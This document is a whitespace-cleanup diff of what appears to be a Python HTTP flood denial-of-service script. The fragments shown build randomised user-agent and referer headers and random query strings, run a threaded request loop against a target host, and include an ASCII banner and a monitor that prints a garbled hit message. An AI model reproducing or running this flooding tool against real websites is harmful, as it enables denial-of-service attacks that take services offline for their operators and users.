@@ -24,7 +24,6 @@ def set_flag(val):
 def set_safe():
 	global safe
 	safe=1
-	
 # generates a user agent array
 def useragent_list():
 	global headers_useragents
@@ -50,7 +49,7 @@ def referer_list():
 	headers_referers.append('http://engadget.search.aol.com/search?q=')
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
-	
+
 #builds random ascii string
 def buildblock(size):
 	out_str = ''
@@ -87,11 +86,11 @@ print \
      `:::::`::::::::::::;'`:;::#                O
       `:::::`::::::::;' /  / `:#
        ::::::`:::::;'  /  /   `#
-                                          
+
 """
 print '---------------------------------------------------'
 
-	
+
 #http request
 def httpcall(url):
 	useragent_list()
@@ -122,10 +121,10 @@ def httpcall(url):
 	else:
 			inc_counter()
 			urllib2.urlopen(request)
-	return(code)		
+	return(code)
 
-	
-#http caller thread 
+
+#http caller thread
 class HTTPThread(threading.Thread):
 	def run(self):
 		try:
@@ -147,7 +146,7 @@ class MonitorThread(threading.Thread):
 		if flag==2:
 			print "\n -M60 Hits are secced"
 
-#execute 
+#execute
 if len(sys.argv) < 2:
 	usage()
 	sys.exit()
